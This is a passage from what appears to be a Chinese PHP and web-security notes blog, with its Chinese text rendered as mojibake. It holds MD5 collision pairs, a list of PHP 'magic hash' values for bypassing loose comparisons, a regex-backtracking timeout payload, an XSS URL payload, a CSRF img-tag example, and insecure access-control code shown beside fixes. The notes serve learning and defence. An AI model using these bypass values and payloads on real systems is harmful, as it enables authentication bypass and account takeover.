class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">ä¸¤ä¸ª md5 ä¸€æ ·çš„å­—ç¬¦ä¸²</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> future.moves.urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">input1 = <span class="string">'Oded Goldreich\nOded Goldreich\nOded Goldreich\nOded Go'</span> + unhexlify(</span><br><span class="line"><span class="string">'d8050d0019bb9318924caa96dce35cb835b349e144e98c50c22cf461244a4064bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf67c12978647f5af123de3acf844085cd025b956'</span>)</span><br><span class="line"></span><br><span class="line">print(quote(input1))</span><br><span class="line">print md5(input1).hexdigest()</span><br><span class="line"></span><br><span class="line">input2 = <span class="string">'Neal Koblitz\nNeal Koblitz\nNeal Koblitz\nNeal Koblitz\n'</span> + unhexlify(<span class="string">'75b80e0035f3d2c909af1baddce35cb835b349e144e88c50c22cf461244a40e4bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf6fc11978647f5af123de3acf84408dcd025b956'</span>)</span><br><span class="line">print md5(input2).hexdigest()</span><br><span class="line">print(quote(input2))</span><br><span class="line"><span class="keyword">from</span> array <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">input1 = array(<span class="string">'I'</span>, [<span class="number">0x6165300e</span>,<span class="number">0x87a79a55</span>,<span class="number">0xf7c60bd0</span>,<span class="number">0x34febd0b</span>,<span class="number">0x6503cf04</span>,<span class="number">0x854f709e</span>,<span class="number">0xfb0fc034</span>,<span class="number">0x874c9c65</span>,<span class="number">0x2f94cc40</span>,<span class="number">0x15a12deb</span>,<span class="number">0x5c15f4a3</span>,<span class="number">0x490786bb</span>,<span class="number">0x6d658673</span>,<span class="number">0xa4341f7d</span>,<span class="number">0x8fd75920</span>,<span class="number">0xefd18d5a</span>])</span><br><span class="line">input2 = array(<span class="string">'I'</span>, [x^y <span class="keyword">for</span> x,y <span class="keyword">in</span> zip(input1, [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&lt;&lt;<span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&lt;&lt;<span class="number">31</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])])</span><br><span class="line">print(input1 == input2) # False</span><br><span class="line">print(md5(input1).hexdigest()) # cee9a457e790cf20d4bdaa6d69f01e41</span><br><span class="line">print(md5(input2).hexdigest()) # cee9a457e790cf20d4bdaa6d69f01e41</span><br><span class="line"></span><br><span class="line"><span class="comment">// '0e5093234' ä¸º 0ï¼Œ'0eabc3234' ä¸ä¸º 0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="string">'0e509367213418206700842008763514'</span> == <span class="string">'0e481036490867661113260034900752'</span></span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="string">'0e481036490867661113260034900752'</span> == <span class="string">'0'</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">// false</span></span><br><span class="line">var_dump(<span class="string">'0'</span> == <span class="string">'0e1abcd'</span>);</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line">var_dump(<span class="number">0</span> == <span class="string">'0e1abcd'</span>);</span><br><span class="line"> </span><br><span class="line">var_dump(md5(<span class="string">'240610708'</span>) == md5(<span class="string">'QNKCDZO'</span>));</span><br><span class="line">var_dump(md5(<span class="string">'aabg7XSs'</span>) == md5(<span class="string">'aabC9RqS'</span>));</span><br><span class="line">var_dump(sha1(<span class="string">'aaroZmOk'</span>) == sha1(<span class="string">'aaK1STfY'</span>));</span><br><span class="line">var_dump(sha1(<span class="string">'aaO8zKZF'</span>) == sha1(<span class="string">'aa3OFF9m'</span>));</span><br><span class="line">æ‰¾å‡º <span class="number">0</span>e å¼€å¤´çš„ hash ç¢°æ’ï¼Œå¯ä»¥ç”¨å¦‚ä¸‹ä»£ç </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$salt = <span class="string">'vunp'</span>;</span><br><span class="line">$hash = <span class="string">'0e612198634316944013585621061115'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">1</span>; $i&lt;<span class="number">100000000000</span>; $i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (md5($salt . $i) == $hash) &#123;</span><br><span class="line">        echo $i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">echo <span class="string">'  done'</span>;</span><br><span class="line"><span class="number">0</span>e å¼€å¤´ï¼Œmd5åé¢å…¨æ˜¯æ•°å­—çš„</span><br><span class="line"><span class="number">240610708</span>: <span class="number">0e462097431906509019562988736854</span></span><br><span class="line">QLTHNDT: <span class="number">0e405967825401955372549139051580</span></span><br><span class="line">QNKCDZO: <span class="number">0e830400451993494058024219903391</span></span><br><span class="line">PJNPDWY: <span class="number">0e291529052894702774557631701704</span></span><br><span class="line">NWWKITQ: <span class="number">0e763082070976038347657360817689</span></span><br><span class="line">NOOPCJF: <span class="number">0e818888003657176127862245791911</span></span><br><span class="line">MMHUWUV: <span class="number">0e701732711630150438129209816536</span></span><br><span class="line">MAUXXQC: <span class="number">0e478478466848439040434801845361</span></span><br><span class="line">IHKFRNS: <span class="number">0e256160682445802696926137988570</span></span><br><span class="line">GZECLQZ: <span class="number">0e537612333747236407713628225676</span></span><br><span class="line">GGHMVOE: <span class="number">0e362766013028313274586933780773</span></span><br><span class="line">GEGHBXL: <span class="number">0e248776895502908863709684713578</span></span><br><span class="line">EEIZDOI: <span class="number">0e782601363539291779881938479162</span></span><br><span class="line">DYAXWCA: <span class="number">0e424759758842488633464374063001</span></span><br><span class="line">DQWRASX: <span class="number">0e742373665639232907775599582643</span></span><br><span class="line">BRTKUJZ: <span class="number">00e57640477961333848717747276704</span></span><br><span class="line">ABJIHVY: <span class="number">0e755264355178451322893275696586</span></span><br><span class="line">aaaXXAYW: <span class="number">0e540853622400160407992788832284</span></span><br><span class="line">aabg7XSs: <span class="number">0e087386482136013740957780965295</span></span><br><span class="line">aabC9RqS: <span class="number">0e041022518165728065344349536299</span></span><br><span class="line">sha1</span><br><span class="line"><span class="number">10932435112</span>: <span class="number">0e07766915004133176347055865026311692244</span></span><br><span class="line">aaroZmOk: <span class="number">0e66507019969427134894567494305185566735</span></span><br><span class="line">aaK1STfY: <span class="number">0e76658526655756207688271159624026011393</span></span><br><span class="line">aaO8zKZF: <span class="number">0e89257456677279068558073954252716165668</span></span><br><span class="line">aa3OFF9m: <span class="number">0e36977786278517984959260394024281014729</span></span><br><span class="line"></span><br><span class="line">crc32 </span><br><span class="line"><span class="number">6586</span>: <span class="number">0e817678</span></span><br><span class="line"></span><br><span class="line">pre_match åœ¨åŒ¹é…çš„æ—¶å€™ä¼šæ¶ˆè€—è¾ƒå¤§çš„èµ„æºï¼Œå¹¶ä¸”é»˜è®¤å­˜åœ¨è´ªå©ªåŒ¹é…ï¼Œå¦‚æœä¼ å…¥ä¸€ä¸ªè¶…é•¿çš„å­—ç¬¦ä¸²ï¼Œä¼šå¯¼è‡´ pre_match æ¶ˆè€—å¤§é‡èµ„æºä»è€Œå¯¼è‡´ php è¶…æ—¶ï¼Œåé¢çš„ php è¯­å¥å°±ä¸ä¼šæ‰§è¡Œã€‚payload:</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">$code=<span class="string">"xdsec###AAAAAAAAAAAAAAAAAAA(è¶…å¤šä¸ªA)"</span>;</span><br><span class="line">preg_match(<span class="string">"/(\d+)\.(\d+)\.(\d+)\.(\d+)/"</span>, $code));</span><br></pre></td></tr></table></figure>
<h3 id="æ–¹æ³•å¤šæ¬¡è°ƒç”¨"><a href="#æ–¹æ³•å¤šæ¬¡è°ƒç”¨" class="headerlink" title="æ–¹æ³•å¤šæ¬¡è°ƒç”¨"></a>æ–¹æ³•å¤šæ¬¡è°ƒç”¨</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">https:<span class="comment">//segmentfault.com/a/1190000007210948</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyDate</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getCurrentDate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">static</span> $current_date = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!$current_date) &#123;</span><br><span class="line">            echo <span class="string">'only run one time'</span>;</span><br><span class="line">            usleep(<span class="number">200000</span>);</span><br><span class="line">            $current_date  = date(<span class="string">'Y-m-d H:i:s'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $current_date;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getCurrentDate2</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        usleep(<span class="number">200000</span>);</span><br><span class="line">        echo <span class="string">'run everytime'</span>;</span><br><span class="line">        <span class="keyword">return</span> date(<span class="string">'Y-m-d H:i:s'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$start = microtime(<span class="literal">true</span>);</span><br><span class="line">$i = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">while</span> ($i--) &#123;</span><br><span class="line">    MyDate::getCurrentDate();</span><br><span class="line">&#125;</span><br><span class="line">echo microtime(<span class="literal">true</span>) - $start;    <span class="comment">//200ms</span></span><br><span class="line"></span><br><span class="line">$start = microtime(<span class="literal">true</span>);</span><br><span class="line">$i = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">while</span> ($i--) &#123;</span><br><span class="line">    MyDate::getCurrentDate2();</span><br><span class="line">&#125;</span><br><span class="line">echo microtime(<span class="literal">true</span>) - $start;    <span class="comment">//1s</span></span><br></pre></td></tr></table></figure>
<h3 id="è¶Šæƒæ¼æ´"><a href="#è¶Šæƒæ¼æ´" class="headerlink" title="è¶Šæƒæ¼æ´"></a>è¶Šæƒæ¼æ´</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">æ°´å¹³è¶Šæƒå°±æ˜¯åŒç­‰è§’è‰²ä¸‹çš„ç”¨æˆ·ï¼Œä¸ä½†èƒ½å¤Ÿè®¿é—®å’Œæ“ä½œè‡ªå·±ç§æœ‰çš„æ•°æ®ï¼Œè¿˜èƒ½è®¿é—®å…¶ä»–äººç§æœ‰çš„æ•°æ®ï¼Œå…¶æ ¹æœ¬æ˜¯åŸºäºæ•°æ®çš„è®¿é—®æƒé™ã€‚</span><br><span class="line"> # 1 åˆ é™¤å‰é‰´æƒå¤„ç†</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">destory</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $payment = Payment::find($id);</span><br><span class="line">        <span class="keyword">if</span> ($payment-&gt;user_id != $<span class="keyword">this</span>-&gt;currentUser-&gt;id) &#123;</span><br><span class="line">            <span class="keyword">return</span> ...</span><br><span class="line">        &#125;</span><br><span class="line">        $payment-&gt;<span class="keyword">delete</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # 2 å‚å…¥idæŸ¥è¯¢åˆ é™¤</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">destory</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Payment::whereUserId($<span class="keyword">this</span>-&gt;currentUser-&gt;id)-&gt;whereId($id)-&gt;<span class="keyword">delete</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # 3 æ¨¡å‹å…³è”æŸ¥è¯¢</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        public <span class="function"><span class="keyword">function</span> <span class="title">payments</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;hasMany(<span class="string">'App\Payment'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PaymentController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        public <span class="function"><span class="keyword">function</span> <span class="title">destory</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;currentUser-&gt;payments()-&gt;whereId($id)-&gt;<span class="keyword">delete</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">åœ¨ findPassword é‡Œé¢å†æ¬¡éªŒè¯å®Œæˆé‚®ç®±æ ¡éªŒçš„è´¦æˆ·æ˜¯å¦ä¸ºå½“å‰æ‰¾å›å¯†ç çš„è´¦å·</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        public <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (checkEmail($data[<span class="string">'email'</span>], $data[<span class="string">'code'</span>])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public <span class="function"><span class="keyword">function</span> <span class="title">findPassword</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (checkEmail($data[<span class="string">'email'</span>], $data[<span class="string">'code'</span>])) &#123;</span><br><span class="line">                $user = User::whereEmail($data[<span class="string">'email'</span>])-&gt;first();</span><br><span class="line">                $user-&gt;password = $data[<span class="string">'new_password'</span>];</span><br><span class="line">                $user-&gt;save();</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//learnku.com/articles/28505#topnav</span></span><br></pre></td></tr></table></figure>
<h3 id="é™åˆ¶åˆ†é¡µæ¡ç›®"><a href="#é™åˆ¶åˆ†é¡µæ¡ç›®" class="headerlink" title="é™åˆ¶åˆ†é¡µæ¡ç›®"></a>é™åˆ¶åˆ†é¡µæ¡ç›®</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">æ¶æ„è¯·æ±‚è€…è¯·æ±‚æŠŠ pagesize è¾“å…¥ <span class="number">5000</span>,<span class="number">10000</span> ç­‰ç”šè‡³æ›´å¤§çš„æ•°ï¼Œä¼šç»™æ•°æ®åº“å¸¦æ¥ä¸€å®šçš„å‹åŠ›ï¼Œlocalhost/api/articles?pageid=<span class="number">0</span>&amp;pagesize=<span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç”¨æ¡†æ¶è‡ªå¸¦çš„åˆ†é¡µæ–¹æ³•</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      $builder = Article::<span class="keyword">with</span>(<span class="string">'category:id,name'</span>)-&gt;orderBy(<span class="string">'id'</span>, <span class="string">'desc'</span>)-&gt;paginate(<span class="number">8</span>);</span><br><span class="line">      <span class="keyword">return</span> response()-&gt;json([<span class="string">'status'</span> =&gt; <span class="literal">true</span>, <span class="string">'count'</span> =&gt; $builder-&gt;total(), <span class="string">'articles'</span> =&gt; $builder-&gt;items()]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        $searchQuery = $_GET[<span class="string">'q'</span>];</span><br><span class="line">        <span class="comment">/* some search magic here */</span></span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;h1&gt;You searched <span class="keyword">for</span>: &lt;?php echo $searchQuery; ?&gt;&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">å› ä¸ºæˆ‘ä»¬æŠŠç”¨æˆ·çš„å†…å®¹ç›´æ¥æ‰“å°å‡ºæ¥ï¼Œä¸ç»è¿‡ä»»ä½•è¿‡æ»¤ï¼Œéæ³•ç”¨æˆ·å¯ä»¥æ‹¼æ¥ URLï¼š search.php?q=%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E</span></span><br><span class="line"><span class="regexp">PHP æ¸²æŸ“å‡ºæ¥çš„å†…å®¹å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ° Javascript ä»£ç ä¼šè¢«ç›´æ¥æ‰§è¡Œï¼š</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">&lt;h1&gt;You searched for: &lt;script&gt;alert(1);&lt;/</span>script&gt;&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;We found: Absolutely nothing because <span class="keyword">this</span> is a demo&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br></pre></td></tr></table></figure>
<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ä¾‹å¦‚ç½‘ç«™ä¸Šæœ‰ç”¨æˆ·å¯ä»¥ç”¨æ¥æ³¨é”€è´¦æˆ·çš„é“¾æ¥ã€‚</span><br><span class="line"></span><br><span class="line">&lt;a href=<span class="string">"http://your-website.com/delete-account"</span>&gt;é”€æ¯è´¦æˆ·&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">å¦‚æœæŸä¸ªç”¨æˆ·è¯„è®ºï¼š</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;img src=â€http:/</span><span class="regexp">/your-website.com/</span><span class="keyword">delete</span>-accountâ€&gt; wow</span><br><span class="line">ç”¨æˆ·å°†åœ¨æŸ¥çœ‹æ­¤è¯„è®ºçš„æ—¶å€™åˆ é™¤ä»–ä»¬çš„è´¦å·ã€‚</span><br></pre></td></tr></table></figure>
<h3 id="No-input-file-specified"><a href="#No-input-file-specified" class="headerlink" title="No input file specified"></a>No input file specified</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">2019/05/23 12:31:44 [error] 5085#5085: *1 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/home/vagrant/Code/haopai-git/public/index.php) is not within the allowed path(s): (/www/wwwroot/dev.guooo.top/:/tmp/:/proc/) in Unknown on line 0</span><br><span class="line">PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted <span class="keyword">in</span> Unknown on line <span class="number">0</span></span><br><span class="line">Unable to open primary script: <span class="regexp">/home/</span>vagrant/Code/haopai-git/public/index.php (Operation not permitted)<span class="string">" while reading response header from upstream, client: 192.168.10.1, server: hp.hopa.cc, request: "</span>GET / HTTP/<span class="number">1.1</span><span class="string">", upstream: "</span>fastcgi:<span class="comment">//unix:/var/run/php/php7.2-fpm.sock:", host: "hp.hopa.cc"</span></span><br><span class="line">çœ‹åˆ°ä¸Šé¢çš„é”™è¯¯ï¼Œæˆ‘ä¹Ÿå»ç½‘ä¸Šæ‰¾ï¼Œç½‘ä¸Šä¸»è¦æ˜¯è¯´ ngnix é‡Œé¢é…ç½® fastcgi_param çš„é—®é¢˜ï¼Œä½†æ˜¯æˆ‘è§‰å¾—ä¸å¯¹å§ï¼Œå› ä¸ºåˆ«çš„é¡¹ç›®éƒ½æ²¡æœ‰é—®é¢˜ï¼Œå•å•å°±è¿™ä¸ªé¡¹ç›®æœ‰é—®é¢˜ã€‚ä¸çŸ¥æ€ä¹ˆäº†ï¼Œæˆ‘å°±æ³¨æ„åˆ° <span class="string">"/www/wwwroot/"</span> è¿™ä¸ªä¸œè¥¿ï¼Œæˆ‘ç”µè„‘é‡Œå°±ä¸åº”è¯¥æœ‰è¿™ä¸ªæ–‡ä»¶å¤¹å•Šï¼Œäºæ˜¯æˆ‘å°±å»é¡¹ç›®é‡ŒæŸ¥æ‰¾è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œæœ€ååœ¨ .user.ini è¿™ä¸ªæ–‡ä»¶æ‰¾åˆ°äº†ï¼Œå½“æˆ‘çœ‹åˆ°è¿™ä¸ªæ–‡ä»¶çš„æ—¶å€™æˆ‘å°±æ„è¯†åˆ°æ˜¯ä»–çš„é—®é¢˜ï¼Œæˆ‘æŠŠè¿™ä¸ªæ–‡ä»¶é‡Œé¢çš„é…ç½®åˆ äº†ã€‚æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</span><br><span class="line"></span><br><span class="line">open_basedir=***********</span><br><span class="line">https:<span class="comment">//learnku.com/articles/28858</span></span><br></pre></td></tr></table></figure>
<h3 id="ä¸€ä¸ªç®€å•çš„composeråŒ…"><a href="#ä¸€ä¸ªç®€å•çš„composeråŒ…" class="headerlink" title="ä¸€ä¸ªç®€å•çš„composeråŒ…"></a>ä¸€ä¸ªç®€å•çš„composeråŒ…</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">vi https:<span class="comment">//github.com/jianyan74/php-excel/blob/master/composer.json</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="string">"name"</span>: <span class="string">"jianyan74/php-excel"</span>,</span><br><span class="line">	<span class="string">"description"</span>: <span class="string">"php excel å¯¼å…¥å¯¼å‡º"</span>,</span><br><span class="line">	<span class="string">"keywords"</span>: [<span class="string">"excel"</span>, <span class="string">"csv"</span>, <span class="string">"xlsx"</span>, <span class="string">"xls"</span>, <span class="string">"html"</span>, <span class="string">"jianyan74"</span>],</span><br><span class="line">	<span class="string">"license"</span>: <span class="string">"MIT"</span>,</span><br><span class="line">	<span class="string">"authors"</span>: [</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="string">"name"</span>: <span class="string">"jianyan74"</span></span><br><span class="line">		&#125;</span><br><span class="line">	],</span><br><span class="line">	<span class="string">"type"</span>: <span class="string">"extension"</span>,</span><br><span class="line">	<span class="string">"require"</span>: &#123;</span><br><span class="line">		<span class="string">"php"</span>: <span class="string">"&gt;=7.0"</span>,</span><br><span class="line">		<span class="string">"phpoffice/phpspreadsheet"</span>: <span class="string">"^1.3"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="string">"autoload"</span>: &#123;</span><br><span class="line">		<span class="string">"psr-4"</span>: &#123;</span><br><span class="line">			<span class="string">"jianyan\\excel\\"</span>: <span class="string">"./src"</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vi  </span><br><span class="line">&lt;?php</span><br><span class="line">namespace jianyan\excel;</span><br><span class="line">use Exception;</span><br><span class="line">use PhpOffice\PhpSpreadsheet\Cell\Coordinate;</span><br><span class="line">use PhpOffice\PhpSpreadsheet\Spreadsheet;</span><br><span class="line">use PhpOffice\PhpSpreadsheet\Writer\Html;</span><br><span class="line">use 